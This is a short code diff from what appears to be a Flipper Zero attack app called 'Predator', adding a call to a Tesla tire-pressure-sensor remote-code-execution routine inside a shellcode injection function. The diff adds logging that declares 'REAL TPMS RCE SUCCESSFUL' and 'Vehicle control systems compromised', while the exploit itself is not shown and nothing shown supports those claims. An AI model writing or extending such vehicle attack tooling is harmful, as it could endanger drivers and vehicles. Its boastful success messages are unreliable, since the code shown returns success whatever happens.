@@ -1,4 +1,5 @@
 #include "predator_tesla_advanced.h"
+#include "predator_tesla_tpms_rce.h"
 #include "../predator_i.h"
 
 bool predator_tesla_advanced_init(PredatorApp* app) {
@@ -110,6 +111,16 @@ bool predator_tesla_tpms_inject_payload(PredatorApp* app, const uint8_t* payload
     FURI_LOG_D("TeslaAdv", "  Shellcode: %zu bytes", len);
     FURI_LOG_D("TeslaAdv", "  Return address override: 0x%02X%02X%02X%02X", 
                payload[0], payload[1], payload[2], payload[3]);
+    
+    bool rce_result = predator_tesla_tpms_execute_rce(app);
+    
+    if(rce_result) {
+        FURI_LOG_E("TeslaAdv", "✓ REAL TPMS RCE SUCCESSFUL");
+        FURI_LOG_E("TeslaAdv", "✓ Remote code execution achieved");
+        FURI_LOG_W("TeslaAdv", "✓ Vehicle control systems compromised");
+    } else {
+        FURI_LOG_W("TeslaAdv", "TPMS RCE failed - target not vulnerable");
+    }
     
     FURI_LOG_I("TeslaAdv", "Transmission complete");
     return true;
